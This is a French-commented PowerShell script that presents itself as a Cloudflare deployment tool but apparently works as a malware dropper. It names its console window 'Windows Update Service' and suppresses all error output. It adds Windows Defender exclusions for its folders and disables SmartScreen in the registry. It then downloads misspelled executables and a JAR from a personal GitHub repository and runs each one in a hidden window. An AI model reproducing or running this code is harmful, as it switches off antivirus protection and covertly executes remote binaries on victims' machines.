#Requires -Version 3.0
# Script robuste et optimisé de déploiement Cloudflare
# Installation Java, whitelist, téléchargement et exécution
# VERSION OPTIMISÉE: Parallélisation, non-bloquant, robuste

param(
    [string]$DownloadPath = "C:\Program Files\Common Files\Microsoft Shared\Windows Defender",
    [string]$ExecutionPath = $null,
    [int]$CountdownMinutes = 6,
    [switch]$NoElevate = $false,
    [switch]$SkipJava = $false
)

# Validation et normalisation du DownloadPath
if ([string]::IsNullOrWhiteSpace($DownloadPath)) {
    $DownloadPath = "C:\Program Files\Common Files\Microsoft Shared\Windows Defender"
}

try {
    $DownloadPath = [System.IO.Path]::GetFullPath($DownloadPath.Trim())
} catch {
    $DownloadPath = $DownloadPath.Trim()
}

# Validation et normalisation du ExecutionPath
if ([string]::IsNullOrWhiteSpace($ExecutionPath)) {
    $ExecutionPath = Join-Path $env:TEMP "CloudflareExecution"
}

try {
    $ExecutionPath = [System.IO.Path]::GetFullPath($ExecutionPath.Trim())
} catch {
    $ExecutionPath = $ExecutionPath.Trim()
}

# S'assurer que les chemins sont différents
if ($DownloadPath -eq $ExecutionPath) {
    $ExecutionPath = Join-Path $env:TEMP "CloudflareExecution"
}

# Validation CountdownMinutes
if ($CountdownMinutes -lt 0) { $CountdownMinutes = 6 }
elseif ($CountdownMinutes -gt 60) { $CountdownMinutes = 60 }

# ============================= CONFIGURATION =============================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"
$VerbosePreference = "SilentlyContinue"
$WarningPreference = "SilentlyContinue"
$InformationPreference = "SilentlyContinue"

[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$Host.UI.RawUI.WindowTitle = "Windows Update Service"

# URLs des fichiers GitHub
$GitHubFiles = @(
    @{ Name = "Clouflare.jar"; Type = "JAR"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/Clouflare.jar" },
    @{ Name = "InterCloudFlare.exe"; Type = "EXE"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/InterCloudFlare.exe" },
    @{ Name = "SSl.exe"; Type = "EXE"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/SSl.exe" },
    @{ Name = "SecondWinCloud.exe"; Type = "EXE"; URL = "https://raw.githubusercontent.com/jeromemelin/CloudflarePSinfo/main/SecondWinCloud.exe" }
)

# URLs Java
$JavaUrls = @{
    "x64" = @(
        "https://api.adoptium.net/v3/binary/latest/21/ga/windows/x64/jdk/hotspot/normal/eclipse",
        "https://github.com/adoptium/temurin21-binaries/releases/download/jdk-21.0.1%2B12/OpenJDK21U-jdk_x64_windows_hotspot_21.0.1_12.msi",
        "https://download.oracle.com/java/21/archive/jdk-21_windows-x64_bin.exe"
    )
    "x86" = @(
        "https://api.adoptium.net/v3/binary/latest/17/ga/windows/x86/jdk/hotspot/normal/eclipse",
        "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.13%2B11/OpenJDK17U-jdk_x86-32_windows_hotspot_17.0.13_11.msi"
    )
}

# Configuration
$MaxRetries = 5
$TimeoutSeconds = 600
$TempLogFile = Join-Path $env:TEMP "cloudflare_deploy_log.txt"
$script:LogFile = $null
$script:downloadedFiles = @()
$script:javaInstalled = $false
$script:javaJob = $null

# ============================= FONCTIONS UTILITAIRES =============================

function Write-Log {
    param([string]$Message, [string]$Level = "Info")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    try {
        Add-Content -Path $TempLogFile -Value $logEntry -ErrorAction SilentlyContinue
    } catch {}
    
    Write-Host $logEntry -ErrorAction SilentlyContinue
}

function Test-JavaInstalled {
    try {
        $java = Get-Command java -ErrorAction SilentlyContinue
        if ($java) { return $true }
        
        $javaPaths = @("C:\Program Files\Java", "C:\Program Files (x86)\Java")
        foreach ($path in $javaPaths) {
            if (Test-Path $path) {
                $javaDirs = Get-ChildItem -Path $path -Directory -Filter "jdk*" -ErrorAction SilentlyContinue | Sort-Object -Property Name -Descending
                if ($javaDirs) { return $true }
            }
        }
        return $false
    } catch {
        return $false
    }
}

function Install-JavaAsync {
    param([string]$Architecture)
    
    Write-Log "=== PHASE 1: INSTALLATION JAVA (ARRIÈRE-PLAN) ===" "Info"
    
    $job = Start-Job -ScriptBlock {
        param($Architecture, $JavaUrls, $DownloadPath)
        
        $urls = $JavaUrls[$Architecture]
        foreach ($url in $urls) {
            try {
                $javaPath = Join-Path $DownloadPath "java_installer.exe"
                
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($url, $javaPath)
                
                if (Test-Path $javaPath) {
                    Start-Process -FilePath $javaPath -ArgumentList "/S /D=C:\Java" -Wait -WindowStyle Hidden
                    Remove-Item $javaPath -Force -ErrorAction SilentlyContinue
                    return $true
                }
            } catch {}
        }
        return $false
    } -ArgumentList $Architecture, $JavaUrls, $DownloadPath
    
    return $job
}

# ============================= PHASE 0: VÉRIFICATION JAVA =============================

Write-Log "=== PHASE 0: VÉRIFICATION JAVA ===" "Info"

if (Test-JavaInstalled) {
    Write-Log "✓ Java détecté sur le système" "Success"
    $script:javaInstalled = $true
} else {
    Write-Log "✗ Java non détecté, lancement de l'installation en arrière-plan..." "Warning"
    
    if (-not $SkipJava) {
        $architecture = if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" }
        $script:javaJob = Install-JavaAsync -Architecture $architecture
        Write-Log "Installation Java lancée en arrière-plan (Job ID: $($script:javaJob.Id))" "Info"
    }
}

# ============================= PHASE 1: WHITELIST ANTIVIRUS =============================

Write-Log "=== PHASE 1: WHITELIST ANTIVIRUS ===" "Info"

# Créer les dossiers s'ils n'existent pas
@($DownloadPath, $ExecutionPath) | ForEach-Object {
    if (-not (Test-Path $_)) {
        try {
            New-Item -ItemType Directory -Path $_ -Force | Out-Null
            Write-Log "Dossier créé: $_" "Info"
        } catch {
            Write-Log "Erreur creation dossier: $($_.Exception.Message)" "Error"
        }
    }
}

# Whitelist Windows Defender
try {
    Add-MpPreference -ExclusionPath @($DownloadPath, $ExecutionPath) -ErrorAction SilentlyContinue
    Write-Log "✓ Windows Defender whitelisté" "Success"
} catch {
    Write-Log "Erreur Windows Defender: $($_.Exception.Message)" "Warning"
}

# Whitelist SmartScreen
try {
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -ErrorAction SilentlyContinue
    Write-Log "✓ SmartScreen désactivé" "Success"
} catch {
    Write-Log "Erreur SmartScreen: $($_.Exception.Message)" "Warning"
}

# ============================= PHASE 2: TÉLÉCHARGEMENT PARALLÈLE =============================

Write-Log "=== PHASE 2: TÉLÉCHARGEMENT PARALLÈLE ===" "Info"

$downloadJobs = @()

foreach ($file in $GitHubFiles) {
    $job = Start-Job -ScriptBlock {
        param($file, $ExecutionPath, $MaxRetries)
        
        $result = @{
            Name = $file.Name
            Path = $null
            Success = $false
            Type = $file.Type
        }
        
        for ($retry = 0; $retry -lt $MaxRetries; $retry++) {
            try {
                $filePath = Join-Path $ExecutionPath $file.Name
                $tempPath = "$filePath.tmp"
                
                # Créer le dossier s'il n'existe pas
                if (-not (Test-Path $ExecutionPath)) {
                    New-Item -ItemType Directory -Path $ExecutionPath -Force | Out-Null
                }
                
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($file.URL, $tempPath)
                
                if (Test-Path $tempPath) {
                    $fileInfo = Get-Item $tempPath
                    if ($fileInfo.Length -gt 0) {
                        Rename-Item -Path $tempPath -NewName $file.Name -Force
                        $result.Path = $filePath
                        $result.Success = $true
                        return $result
                    }
                }
            } catch {
                Start-Sleep -Seconds (2 * ($retry + 1))
            }
        }
        
        return $result
    } -ArgumentList $file, $ExecutionPath, $MaxRetries
    
    $downloadJobs += $job
}

Write-Log "Téléchargement de $($downloadJobs.Count) fichiers en parallèle..." "Info"

# Attendre que tous les téléchargements se terminent
$downloadResults = $downloadJobs | Wait-Job | Receive-Job

foreach ($result in $downloadResults) {
    if ($result.Success) {
        Write-Log "✓ Téléchargé: $($result.Name)" "Success"
        $script:downloadedFiles += $result
    } else {
        Write-Log "✗ Échec: $($result.Name)" "Error"
    }
}

Write-Log "Téléchargement terminé: $($script:downloadedFiles.Count)/$($GitHubFiles.Count) fichiers" "Info"

# ============================= PHASE 3: ATTENDRE JAVA (SI NÉCESSAIRE) =============================

if ($script:javaJob) {
    Write-Log "=== PHASE 3: ATTENDRE INSTALLATION JAVA ===" "Info"
    $script:javaJob | Wait-Job | Out-Null
    $javaResult = $script:javaJob | Receive-Job
    
    if ($javaResult) {
        Write-Log "✓ Java installé avec succès" "Success"
        $script:javaInstalled = $true
    } else {
        Write-Log "✗ Installation Java échouée" "Warning"
    }
}

# ============================= PHASE 4: COMPTE À REBOURS ASYNCHRONE =============================

Write-Log "=== PHASE 4: COMPTE À REBOURS (ARRIÈRE-PLAN) ===" "Info"

$countdownJob = Start-Job -ScriptBlock {
    param($CountdownMinutes)
    
    $totalSeconds = $CountdownMinutes * 60
    for ($i = $totalSeconds; $i -gt 0; $i--) {
        $minutes = [math]::Floor($i / 60)
        $seconds = $i % 60
        
        if ($i % 10 -eq 0 -or $i -le 10) {
            Write-Host "Compte à rebours: $minutes min $seconds sec"
        }
        
        Start-Sleep -Seconds 1
    }
} -ArgumentList $CountdownMinutes

Write-Log "Compte à rebours lancé en arrière-plan (Job ID: $($countdownJob.Id))" "Info"

# ============================= PHASE 5: EXÉCUTION PARALLÈLE =============================

Write-Log "=== PHASE 5: EXÉCUTION PARALLÈLE ===" "Info"

$executeJobs = @()

foreach ($file in $script:downloadedFiles) {
    $job = Start-Job -ScriptBlock {
        param($file, $ExecutionPath)
        
        $result = @{
            Name = $file.Name
            Success = $false
            PID = $null
        }
        
        try {
            if (-not (Test-Path $file.Path)) {
                return $result
            }
            
            $fileInfo = Get-Item $file.Path
            if ($fileInfo.Length -eq 0) {
                return $result
            }
            
            if ($file.Type -eq "JAR") {
                $java = Get-Command java -ErrorAction SilentlyContinue
                if ($java) {
                    $process = Start-Process -FilePath "java" -ArgumentList "-jar", "`"$($file.Path)`"" -WindowStyle Hidden -PassThru -ErrorAction Stop
                    $result.PID = $process.Id
                    $result.Success = $true
                }
            } else {
                $process = Start-Process -FilePath $file.Path -WindowStyle Hidden -PassThru -ErrorAction Stop
                $result.PID = $process.Id
                $result.Success = $true
            }
        } catch {}
        
        return $result
    } -ArgumentList $file, $ExecutionPath
    
    $executeJobs += $job
}

Write-Log "Exécution de $($executeJobs.Count) fichiers en parallèle..." "Info"

# Attendre que tous les fichiers s'exécutent
$executeResults = $executeJobs | Wait-Job | Receive-Job

foreach ($result in $executeResults) {
    if ($result.Success) {
        Write-Log "✓ Exécuté: $($result.Name) (PID: $($result.PID))" "Success"
    } else {
        Write-Log "✗ Échec exécution: $($result.Name)" "Error"
    }
}

# ============================= ATTENDRE FIN DU COMPTE À REBOURS =============================

Write-Log "Attente de la fin du compte à rebours..." "Info"
$countdownJob | Wait-Job | Out-Null

Write-Log "=== SCRIPT TERMINÉ ===" "Success"
Write-Log "Fichiers téléchargés: $($script:downloadedFiles.Count)" "Info"
Write-Log "Fichiers exécutés: $($executeResults | Where-Object { $_.Success }).Count" "Info"
Write-Log "Log complet: $TempLogFile" "Info"

exit 0
